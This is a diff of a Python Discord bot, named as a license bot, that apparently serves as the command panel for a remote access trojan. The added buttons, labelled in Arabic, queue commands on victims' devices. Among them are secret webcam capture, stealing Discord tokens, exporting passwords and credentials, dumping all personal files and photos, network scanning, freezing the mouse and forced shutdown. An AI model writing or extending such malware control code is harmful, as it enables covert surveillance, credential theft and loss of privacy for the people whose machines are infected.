@@ -260,29 +260,6 @@ class LicenseBot(discord.Client):
                         view=DeviceActionsView(dev_code, hwid, ip, port, country), ephemeral=True
                     )
 
-            elif custom_id.startswith(("kill_p_", "rest_p_")):
-                prefix, _, dev_code, proc_name = custom_id.split("_", 3)
-                key = "remote_kill_process" if prefix == "kill" else "remote_restart_process"
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault(key, {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
-                    action_msg = "إغلاق" if prefix == "kill" else "تشغيل"
-                    if save_db(db, sha, url, headers, f"{action_msg} process {proc_name} for {dev_code}"):
-                        await interaction.followup.send(f"⚙️ تم إرسال أمر {action_msg} البرنامج `{proc_name}` بنجاح!", ephemeral=True)
-
-            elif custom_id.startswith(("root_inst_", "root_rem_")):
-                action = "install" if "inst" in custom_id else "remove"
-                dev_code = custom_id.split("_")[-1]
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault("remote_root_installs", {})[dev_code] = {"action": action, "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Root {action} for {dev_code}"):
-                        await interaction.followup.send(f"🌱 تم تنفيذ أمر جذور الإقلاع (`{action}`) للعميل بنجاح!", ephemeral=True)
-
-            elif custom_id in ["dev_act_lock_app", "dev_act_unlock_app"]:
-                # سيتم معالجتها عبر دمج الـ custom_id أو أزرار الـ View المخصصة
-                pass
-
         except Exception as e:
             await interaction.followup.send(f"❌ حدث خطأ غير متوقع: {str(e)}", ephemeral=True)
 
@@ -336,34 +313,76 @@ class DeviceActionsView(discord.ui.View):
         super().__init__(timeout=None)
         self.code = code
 
-    @discord.ui.button(label="⚙️ مراقب العمليات", style=discord.ButtonStyle.primary, custom_id="dev_act_processes", row=0)
-    async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="📁 سحب تقرير البيانات والكريديتس", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=0)
+    async def export_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            db.setdefault("remote_get_processes", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Get processes {self.code}"):
-                await interaction.followup.send("🔍 تم طلب قائمة الألعاب والبرامج النشطة للعميل!", ephemeral=True)
+            db.setdefault("remote_exports", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Export info {self.code}"):
+                await interaction.followup.send("📁 تم طلب ملف التقرير وكلمات المرور للعميل!", ephemeral=True)
 
-    @discord.ui.button(label="📊 مواصفات النظام", style=discord.ButtonStyle.primary, custom_id="dev_act_sysinfo", row=0)
-    async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="📸 التقاط كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=0)
+    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            db.setdefault("remote_sysinfo", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Sysinfo {self.code}"):
-                await interaction.followup.send("📊 تم طلب مواصفات النظام للعميل!", ephemeral=True)
+            db.setdefault("remote_webcams", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Webcam {self.code}"):
+                await interaction.followup.send("📸 تم طلب التقاط صورة الكاميرا السرية للعميل!", ephemeral=True)
 
-    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
-    async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="🔑 سحب توكنات ديسكورد", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
+    async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"SS {self.code}"):
-                await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
+            db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Steal tokens {self.code}"):
+                await interaction.followup.send("🔑 تم طلب سحب توكنات ديسكورد من جهاز العميل!", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=2)
+    @discord.ui.button(label="🌐 فحص الشبكة (NetScan)", style=discord.ButtonStyle.primary, custom_id="dev_act_netscan", row=1)
+    async def netscan_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_netscans", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Netscan {self.code}"):
+                await interaction.followup.send("🌐 تم طلب تقرير فحص الشبكة والـ IPs النشطة!", ephemeral=True)
+
+    @discord.ui.button(label="🖼️ تغيير خلفية الشاشة", style=discord.ButtonStyle.primary, custom_id="dev_act_wallpaper", row=2)
+    async def wp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(WallpaperModal(self.code))
+
+    @discord.ui.button(label="🔒 قفل/تجميد مؤشر الماوس", style=discord.ButtonStyle.danger, custom_id="dev_act_trap", row=2)
+    async def trap_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_trap_cursors", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Trap cursor {self.code}"):
+                await interaction.followup.send("🔒 تم إرسال أمر تجميد وقفل مؤشر الماوس للعميل!", ephemeral=True)
+
+    @discord.ui.button(label="🔓 فك تجميد الماوس", style=discord.ButtonStyle.success, custom_id="dev_act_untrap", row=2)
+    async def untrap_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_untrap_cursors", {})[self.code] = {"id": str(int(time.time()))}
+            if "remote_trap_cursors" in db and self.code in db["remote_trap_cursors"]:
+                del db["remote_trap_cursors"][self.code]
+            if save_db(db, sha, url, headers, f"Untrap cursor {self.code}"):
+                await interaction.followup.send("🔓 تم إرسال أمر فك تجميد مؤشر الماوس!", ephemeral=True)
+
+    @discord.ui.button(label="📂 سحب الملفات والصور الشامل", style=discord.ButtonStyle.success, custom_id="dev_act_diskdump", row=3)
+    async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_disk_dumps", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Disk dump {self.code}"):
+                await interaction.followup.send("📂 تم طلب سحب كافة الملفات والصور الشخصية من جهاز العميل!", ephemeral=True)
+
+    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill", row=4)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -372,14 +391,29 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Close {self.code}"):
                 await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة للعميل!", ephemeral=True)
 
-    @discord.ui.button(label="⚡ إيقاف تشغيل الجهاز بالكامل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=2)
+    @discord.ui.button(label="⚡ إيقاف تشغيل الجهاز بالكامل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_shutdowns", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
-                await interaction.followup.send("⚡ تم إرسال أمر إيقاف تشغيل جهاز العميل!", ephemeral=True)
+                await interaction.followup.send("⚡ تم إرسال أمر إيقاف تشغيل جهاز العميل بالكامل!", ephemeral=True)
+
+class WallpaperModal(discord.ui.Modal, title="تغيير خلفية سطح المكتب"):
+    image_url = discord.ui.TextInput(label="رابط الصورة المباشر", style=discord.TextStyle.short, placeholder="https://...")
+
+    def __init__(self, code):
+        super().__init__()
+        self.code = code
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_wallpapers", {})[self.code] = {"id": str(int(time.time())), "url": str(self.image_url).strip()}
+            if save_db(db, sha, url, headers, f"Wallpaper {self.code}"):
+                await interaction.followup.send("🖼️ تم إرسال أمر تغيير خلفية الشاشة للعميل بنجاح!", ephemeral=True)
 
 class DevicesSubMenuView(discord.ui.View):
     def __init__(self, devices):
